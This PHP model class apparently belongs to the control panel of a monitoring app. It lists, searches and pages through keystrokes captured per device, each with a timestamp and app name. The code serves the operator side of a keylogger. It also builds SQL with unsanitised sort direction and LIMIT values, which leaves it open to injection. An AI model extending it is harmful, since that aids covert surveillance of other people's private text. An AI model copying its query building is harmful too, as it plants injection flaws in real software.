<?php

namespace Models\Cp;

class Keylogger extends \System\Model {

    public function getDataTableData($devId, $params = array()) {
        if (!$devId)
            return null;

        $devId = $this->getDb()->quote($devId);

        $search = '';
        if (!empty($params['search'])) {
            $searched = $this->getDb()->quote('%' . $params['search'] . '%');
            $search = "`app_name` LIKE {$searched} OR `text` LIKE {$searched}";
        }

        $sort = '`timestamp` ASC';
        if (count($params['sortColumns'])) {
            $columns = ['`timestamp`', '`app_name`', '`text`'];

            $sort = '';
            foreach ($params['sortColumns'] as $column => $direction) {
                if (isset($columns[$column])) {
                    $sort .= " {$columns[$column]} {$direction}";
                }
            }
        }

        $select = "SELECT `timestamp`, `app_name`, `text`";

        if (isset($params['timeFrom'], $params['timeTo'])) {
            $timeFrom = $this->getDb()->quote($params['timeFrom']);
            $timeTo = $this->getDb()->quote($params['timeTo']);
            $fromWhere = "FROM `keylogger` WHERE `dev_id` = {$devId} AND `timestamp` >= {$timeFrom} AND `timestamp` <= {$timeTo}";
        } else {
            $fromWhere = "FROM `keylogger` WHERE `dev_id` = {$devId}";
        }

        $query = "{$select} {$fromWhere}"
                . ($search ? " AND ({$search})" : '')
                . " ORDER BY {$sort} LIMIT {$params['start']}, {$params['length']}";

        $result = array(
            'aaData' => $this->getDb()->query($query)->fetchAll(\PDO::FETCH_NUM)
        );

        if (empty($result['aaData'])) {
            $result['iTotalRecords'] = 0;
            $result['iTotalDisplayRecords'] = 0;
        } else {
            $result['iTotalRecords'] = $this->getDb()->query("SELECT COUNT(*) {$fromWhere}")->fetchColumn();

            if ($search) {
                $result['iTotalDisplayRecords'] = $this->getDb()->query("SELECT COUNT(*) {$fromWhere} AND ({$search})")->fetchColumn();
            } else {
                $result['iTotalDisplayRecords'] = $result['iTotalRecords'];
            }
        }

        return $result;
    }
    
    public function getListByDev($devID, $params = array(), $dataTable = true) {
        if (!$devID)
            return null;
        $devID = $this->getDb()->quote($devID);

        $search = '';
        if (!empty($params['filter'])) {
            $searched = mysql_real_escape_string($params['filter']);
            $search = " `text` LIKE '%{$searched}%' OR `app_name` LIKE '%{$searched}%'";
        }

        $count = '10';
        if (!empty($params['count']))
            $count = (int) $params['count'];
        $offset = 0;
        if (!empty($params['offset']))
            $offset = (int) $params['offset'];

        $sort = '`key`.`timestamp` ASC';
        if (!empty($params['sort'])) {
            $columns = ['timestamp', 'app_name', 'text'];
            $toSort = $columns[$params['sort'] - 1];
            if ($toSort) {
                $sortDir = $params['sortDir'] != 'desc' ? 'ASC' : 'DESC';
                $sort = "`key`.`{$toSort}` {$sortDir}";
            }
        }

        $select = "SELECT `key`.*";

        $fromWhere = "FROM `keylogger` `key`  WHERE `key`.`dev_id` = {$devID}\n";

        $query = "{$select} {$fromWhere}"
                . ($search ? " AND ({$search})\n" : '')
                . " ORDER BY {$sort}\n"
                . " LIMIT {$offset}, {$count}\n"
        ;

        if (!$dataTable)
            return $this->getDb()->query($query)->fetchAll();

        $res['aaData'] = $this->getDb()->query($query)->fetchAll();

        if (empty($res['aaData'])) {
            $res['iTotalRecords'] = 0;
            $res['iTotalDisplayRecords'] = 0;
        } else {
            $res['iTotalRecords'] = $this->getDb()->query("SELECT COUNT(*) {$fromWhere}")->fetchColumn();
            if ($search)
                $res['iTotalDisplayRecords'] = $this->getDb()->query("SELECT COUNT(*) {$fromWhere} AND ({$search})")->fetchColumn();
            else
                $res['iTotalDisplayRecords'] = $res['iTotalRecords'];
        }

        return $res;
    }

    public function hasRecords($devId) {
        $devId = $this->getDb()->quote($devId);
        
        return $this->getDb()->query("SELECT `dev_id` FROM `keylogger` WHERE `dev_id` = {$devId} LIMIT 1")->fetchColumn() !== false;
    }
    
}
